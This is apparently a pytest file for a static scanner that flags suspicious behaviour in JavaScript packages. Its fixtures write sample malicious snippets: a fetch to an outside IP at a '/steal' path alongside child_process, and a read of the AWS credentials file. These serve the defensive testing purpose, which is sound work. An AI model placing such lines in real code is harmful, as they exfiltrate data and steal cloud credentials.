from pathlib import Path
from npm_ide_analyst.static.ioc_scan import scan_iocs


def _js(tmp_path: Path, name: str, body: str) -> Path:
    p = tmp_path / name
    p.write_text(body, encoding="utf-8")
    return p


def test_detects_child_process_and_url(tmp_path):
    _js(tmp_path, "a.js",
        "const cp = require('child_process');\n"
        "fetch('http://185.100.87.202/steal');\n")
    findings = scan_iocs(tmp_path)
    cats = {f.category for f in findings}
    assert "process-exec" in cats
    assert "network" in cats


def test_detects_secret_access(tmp_path):
    _js(tmp_path, "b.js", "fs.readFileSync(process.env.HOME + '/.aws/credentials')")
    findings = scan_iocs(tmp_path)
    assert any(f.category == "secret-access" for f in findings)


def test_clean_file_no_iocs(tmp_path):
    _js(tmp_path, "c.js", "export const add = (a, b) => a + b;\n")
    assert scan_iocs(tmp_path) == []
